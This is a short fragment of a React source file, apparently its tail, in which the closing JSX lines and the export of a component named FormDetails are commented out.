//         </div>
//     );
// };

// export default FormDetails;








